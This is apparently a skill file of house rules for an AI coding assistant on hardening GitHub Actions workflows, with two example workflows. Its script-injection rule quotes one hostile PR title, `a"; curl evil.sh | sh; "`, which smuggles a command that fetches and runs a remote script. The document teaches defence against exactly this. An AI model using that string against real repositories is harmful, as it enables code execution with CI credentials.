---
name: github-actions
description: >-
  Use when writing or reviewing GitHub Actions workflows or custom
  actions with production discipline: least-privilege GITHUB_TOKEN
  permissions, SHA-pinned `uses` with automated bumps, script-injection
  safety, concurrency groups and job timeouts, shell and pipefail
  discipline, matrix and cache design, reusable workflows vs composite
  actions, fork-PR trust boundaries, OIDC instead of long-lived cloud
  secrets, environments and deployment gates, and the actionlint/zizmor
  gate.
when_to_use: >-
  Trigger for .github/workflows/*.yml, action.yml, composite or
  JavaScript action authoring, dependabot.yml, workflow review, slow or
  flaky pipelines, cache misses, required checks stuck pending,
  merge-queue failures, secrets in CI, fork-PR hardening, self-hosted
  runners, release/publish automation, or "is this workflow
  production-grade" tiering questions.
disable-model-invocation: false
user-invocable: true
allowed-tools: []
model: inherit
paths:
  - "**/.github/workflows/*.yml"
  - "**/.github/workflows/*.yaml"
  - "**/action.yml"
  - "**/action.yaml"
  - "**/.github/dependabot.yml"
  - "**/.github/actionlint.yaml"
  - "**/.github/actionlint.yml"
  - "**/zizmor.yml"
shell: bash
---

# GitHub Actions Production Rulebook

House rules for GitHub Actions on github.com — the environment-files
(`GITHUB_OUTPUT`) era, where OIDC has replaced long-lived cloud keys,
artifacts are immutable, and a moved tag on a popular action is a live
supply-chain incident rather than a hypothetical one. A workflow is not
configuration. It is a program that runs with repository credentials, on
inputs an attacker can shape, on a machine that can reach production —
so it gets reviewed like code, with named smells and a fix for each.
CONTESTED calls (self-hosted runners, `pull_request_target`, third-party
hardening agents) carry both positions inline — pick one and name why,
don't split the difference silently.

Placeholders below read `REPLACE_WITH_PINNED_SHA`; substitute the real
40-character commit SHA and keep the version comment next to it so
Dependabot can rewrite both.

## Default posture

Surface these thirteen non-negotiables whenever a proposed workflow or
action violates them. Point at the exact rule rather than re-arguing
from first principles — the reference files carry the full rationale and
source links.

- **`permissions:` declared at the top of every workflow.** Start at
  `contents: read` (or `{}`) and widen per job, never the reverse. An
  undeclared block inherits the repository/organization default, which
  on repositories predating the 2023 default flip is still
  **write-all** — every step, including the third-party action nobody
  read, gets a token that can push to the default branch —
  https://docs.github.com/en/actions/reference/security/secure-use
- **Every `uses:` pinned to a full-length commit SHA, with the version
  in a trailing comment AND an automated bumper.** Tags are mutable: in
  March 2025 `tj-actions/changed-files` had every tag from `v1` through
  `v45.0.7` repointed at a secret-dumping commit across 23,000+
  repositories (CVE-2025-30066). SHA-pinning *without* Dependabot or
  Renovate freezes you on known-vulnerable code — worse than a floating
  tag, not safer. Pin **and** automate, the same rule base-image
  digests get in `docker` —
  https://docs.github.com/en/actions/reference/security/secure-use,
  https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
- **Untrusted context never reaches a `run:` body through `${{ }}`.**
  GitHub names `title`, `body`, `head_ref`, `ref`, `label`, `message`,
  `name`, `email`, `page_name`, and `default_branch` as
  attacker-shapeable. `${{ }}` is textual substitution performed
  *before* the shell sees the script, so a PR titled
  `a"; curl evil.sh | sh; "` is not data — it is the next command. Bind
  it to `env:` and reference `"$VAR"` inside the script —
  https://docs.github.com/en/actions/concepts/security/script-injections
- **`concurrency:` on every workflow.** CI groups on
  `${{ github.workflow }}-${{ github.ref }}` with
  `cancel-in-progress: true`, so a superseded push stops burning
  minutes. Deploys group on the environment with
  `cancel-in-progress: false` — a half-applied deploy killed mid-flight
  is worse than a queued one —
  https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax
- **`timeout-minutes` on every job.** The default is **360** — six
  hours of a hung install or a shell waiting on stdin before anything
  notices. Ten to thirty minutes is the normal CI band; name the
  number rather than inheriting the default —
  https://docs.github.com/en/actions/reference/limits
- **`shell: bash` explicitly, or `defaults.run.shell: bash` once per
  workflow.** With no `shell:` key the runner executes `bash -e {0}`;
  with `shell: bash` it executes
  `bash --noprofile --norc -eo pipefail {0}`. The difference is
  `pipefail` — without it, `pytest | tee test.log` reports the exit
  status of `tee`, so a failing suite is a green build —
  https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsshell
- **`pull_request_target` and `workflow_run` never check out or execute
  fork-controlled code.** Both run against the *base* repository with
  its secrets and a writable token; `actions/checkout` with
  `ref: ${{ github.event.pull_request.head.sha }}` under them hands
  that token to a stranger's `Makefile`. Prefer plain `pull_request`
  and accept that it has no secrets — that limitation **is** the
  security boundary —
  https://docs.github.com/en/actions/reference/security/secure-use
- **OIDC, not long-lived cloud credentials.** `id-token: write` plus a
  trust policy on the cloud role yields a per-job, claim-scoped,
  auto-expiring token. A static `AWS_SECRET_ACCESS_KEY` in repository
  secrets is readable by everyone with write access and survives every
  rotation you forget —
  https://docs.github.com/en/actions/concepts/security/openid-connect
- **`persist-credentials: false` on `actions/checkout`** in every job
  that does not push. The default writes the run's token into
  `.git/config`; upload the workspace as an artifact afterwards and you
  have published it — the ArtiPACKED class, still a live finding
  because GitHub considers the default intentional —
  https://www.stepsecurity.io/blog/detect-leaked-secrets-in-github-action-workflow-artifacts
- **Workflow-level `paths:`/`branches:` filters never gate a required
  check.** A workflow skipped by a trigger filter reports *nothing*, so
  the required check sits `Pending` forever and the PR can never merge;
  `merge_group` events do not evaluate path filters against the PR diff
  at all. Filter inside the job with `if:`, or terminate the graph in
  an always-running aggregator job and require that —
  https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks
- **`secrets: inherit` is a review finding; pass named secrets.**
  Blanket inheritance hands a called workflow the entire secret store,
  including the production key it had no reason to see. Enumerate the
  two it actually needs —
  https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations
- **Caches are repository-scoped, not workflow-scoped.** An entry
  written by a PR-triggered job is restorable by a later job on the
  default branch when the keys match — the documented route by which
  poisoned `node_modules` reached a privileged scheduled workflow in
  the Angular `dev-infra` compromise. Key on a lockfile hash, and in
  release/publish workflows either skip the cache or use
  `actions/cache/restore` with a key no PR can produce —
  https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching
- **CI for the CI: `actionlint` + `zizmor` run on the workflows
  themselves.** actionlint type-checks every `${{ }}` expression and
  shellchecks every `run:` block; zizmor audits the security shapes
  (template injection, excessive permissions, artipacked, impostor
  commits, cache poisoning) across 40+ rules. Both are fast, both are
  offline by default, and both catch what review misses —
  https://github.com/rhysd/actionlint, https://docs.zizmor.sh/audits/

## Tiering

The row labels below are the shared infra reference set (identical
across the omniagents-iac skills); the CI-specific mapping follows in
prose.

| Control | T1 demo/portfolio | T2 production | T3 regulated |
|---|---|---|---|
| Encryption in transit + AUTH | optional (VPC-scoped SG suffices) | required | required (mandated wrappers) |
| At-rest encryption | provider default | provider default or CMK | CMK + key policy |
| HA / replicas / failover | no | required for stateful path | required |
| Backups / snapshots | no | required (retention named) | required + tested restore |
| Log delivery / audit | no | error+slow logs | full delivery + retention policy |
| Alarms / notifications | no | memory/error alarms | + SNS ops hooks |

Every control names its tier and its pain. A T1 pipeline passing T1 is
correct, not negligent — enterprise-grade means knowing your tier, not
maximal knobs.

Applied to workflows: the thirteen posture rules above are **T1** —
they cost nothing and a portfolio repository that skips them is simply
wrong. Environment protection rules (required reviewers, deployment
branch policy, wait timer) and OIDC-only cloud access are **T2** for
anything that reaches a real environment, and become the audit trail
itself at **T3**. Build provenance attestations, artifact signing, and
`zizmor --persona=auditor` are **T2+** — a T1 repository with nothing
published has nothing to attest. An egress-filtering runtime agent in
block mode (harden-runner or equivalent) is **T3-or-named-pain**: it
adds a third-party agent inside every job and a per-endpoint allowlist
to maintain, which earns its cost once a compromise or a compliance
requirement names the pain — audit mode first, block mode only with a
baseline. Self-hosted runners are **T3-or-named-pain** and never on
public repositories at any tier; when unavoidable, ephemeral/JIT
registration is the only acceptable shape. Adding T2/T3 controls to a
T1 pipeline is unreviewed scope creep, the same as in the Terraform
tiering table.

## Stack quick-paths

**(a) Canonical pull-request CI.** Every posture rule visible in one
file: pinned `uses`, read-only token, concurrency, timeouts, explicit
shell, lockfile-keyed cache, and untrusted input bound through `env`.

```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

# Read-only by default; individual jobs widen what they need.
permissions:
  contents: read

# Supersede in-flight runs for the same ref; deploy workflows must not.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

defaults:
  run:
    shell: bash  # bash --noprofile --norc -eo pipefail {0}

jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        python-version: ["3.12", "3.13", "3.14"]
    steps:
      - uses: actions/checkout@REPLACE_WITH_PINNED_SHA # v5.0.0
        with:
          persist-credentials: false

      - uses: astral-sh/setup-uv@REPLACE_WITH_PINNED_SHA # v7.1.0
        with:
          version: "0.9.6"
          enable-cache: true
          cache-dependency-glob: "uv.lock"

      - run: uv sync --locked --all-extras --dev

      - name: Test
        run: uv run pytest --junitxml=report.xml

      # Untrusted PR text goes through env, never into the script body.
      - name: Check PR title convention
        if: github.event_name == 'pull_request'
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          if ! grep -qE '^(feat|fix|docs|chore)(\(.+\))?: ' <<<"$PR_TITLE"; then
            echo "::error title=Bad PR title::Use a conventional-commit prefix"
            exit 1
          fi

  # Aggregator gate: this is the required check, so path- or
  # matrix-skipped jobs can never leave a PR pending forever.
  ci-gate:
    if: always()
    needs: [test]
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Fail if any dependency failed
        run: |
          [[ "${{ needs.test.result }}" == "success" ]] || exit 1
```

**(b) OIDC deploy behind an environment gate.** No cloud secret exists
to leak; the environment carries the reviewers and the branch policy,
and the concurrency group serializes rather than cancels.

```yaml
name: deploy

on:
  push:
    tags: ["v*.*.*"]

permissions:
  contents: read

concurrency:
  group: deploy-production
  cancel-in-progress: false  # never kill a deploy mid-apply

jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    # Required reviewers + deployment branch policy live on the
    # environment, not in this file — that is the point.
    environment:
      name: production
      url: https://example.com
    permissions:
      contents: read
      id-token: write  # mint the OIDC token; grants nothing else
    steps:
      - uses: actions/checkout@REPLACE_WITH_PINNED_SHA # v5.0.0
        with:
          persist-credentials: false

      - uses: aws-actions/configure-aws-credentials@REPLACE_WITH_PINNED_SHA # v5.0.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-production
          aws-region: ap-southeast-1
          # No aws-access-key-id / aws-secret-access-key anywhere.

      - name: Deploy
        run: ./scripts/deploy.sh
```

## Reference index

| File | Read when… |
| --- | --- |
| [`references/workflow-design.md`](references/workflow-design.md) | Structuring or reviewing a workflow: trigger and filter choice, the required-check/merge-queue trap, job graph and `needs` fan-out, job outputs, `if:` conditions and `always()`/`failure()`, concurrency groups, timeouts, matrix design and `fail-fast`, shell and `pipefail` discipline, expressions and contexts, environment files (`GITHUB_OUTPUT`/`GITHUB_ENV`/`GITHUB_STEP_SUMMARY`), cache key design, artifact v4 semantics, runner selection, and the platform limits that shape all of it. |
| [`references/security.md`](references/security.md) | Hardening or auditing a workflow: the run's actual threat model, the full `permissions` scope list and patterns, SHA pinning plus Dependabot/Renovate/cooldowns, script injection and `GITHUB_ENV` injection, fork-PR trust boundaries (`pull_request` vs `pull_request_target` vs `workflow_run`) and the safe handoff pattern, cache and artifact poisoning, secret handling and masking rules, the full OIDC setup with claim conditions, self-hosted runner policy, environments as a boundary, egress filtering, and what to do the day a pinned action is compromised. |
| [`references/reuse.md`](references/reuse.md) | Removing duplication or authoring a custom action: the composite-vs-reusable-workflow-vs-JavaScript decision table, `workflow_call` inputs/outputs/secrets and its limits, why called workflows do not inherit `env`, composite `action.yml` mechanics (the mandatory `shell:`, `inputs` context, no `secrets` context), the full metadata reference, JavaScript action shape and `dist/` bundling, versioning with moving major tags plus immutable OCI publishing, testing an action, and the reuse anti-patterns. |
| [`references/gates-and-release.md`](references/gates-and-release.md) | Wiring the pipeline that guards and ships: actionlint and zizmor config with SARIF upload, pre-commit integration, OpenSSF Scorecard and CodeQL for workflows, required checks and merge-queue setup, environment protection rules, release workflow shape (build-then-publish split, provenance attestations, trusted publishing to PyPI/npm), Dependabot config for the `github-actions` ecosystem, and runtime/cost control. |
| [`references/smells.md`](references/smells.md) | Reviewing someone else's workflow, or checking your own before opening the PR: the named smell catalogue — symptom, why it bites, the fix, and where the full rationale lives — grouped by security, correctness, reliability, cost, and maintainability. Start here for a review; the other files carry the reasoning. |

Read only the reference relevant to the current decision. Each file
carries its own headings; cite a specific rule as
`references/<file>.md#<anchor>`, where `<anchor>` is the kebab-case slug
of the heading text exactly as written — for example
`security.md#script-injection` or `smells.md#reliability-smells`.

## What this skill does NOT cover

- **Other CI systems.** GitLab CI, Buildkite, CircleCI, Jenkins, and
  Azure Pipelines share the concepts (least-privilege tokens, pinned
  dependencies, injection safety) but not the syntax, the trust
  boundaries, or the failure modes. Porting a rule here to another
  system is a judgement call, not a lookup.
- **What the pipeline builds.** Dockerfile and compose authoring belong
  to the `docker` skill; that skill's `references/ci-and-release.md`
  owns the `docker/build-push-action` specifics — BuildKit `type=gha`
  cache, multi-arch fan-out, OCI labels, tag strategy, registry
  lifecycle — and this skill does not re-derive them.
- **Infrastructure the workflow deploys to.** The IAM role an OIDC
  workflow assumes, the cluster it deploys onto, and the network it
  crosses are the `terraform` skill's domain. This skill stops at the
  trust relationship and the workflow side of the handshake.
- **Test authoring.** What to assert and how to structure a suite lives
  in the language `testing` skills; this skill covers how the suite is
  invoked, gated, sharded, and reported, not what it checks.
- **GitHub Apps, webhooks, and the REST/GraphQL API** beyond the
  `GITHUB_TOKEN` and app-installation-token usage inside a run. Building
  a bot is a different surface from running one in a workflow.

If a question lands outside this scope, say so rather than bending one
of the references to fit. If a question lands inside the scope but the
answer isn't in the references yet, that is a signal the catalogue
should be extended — flag it and propose the addition rather than
improvising silently.
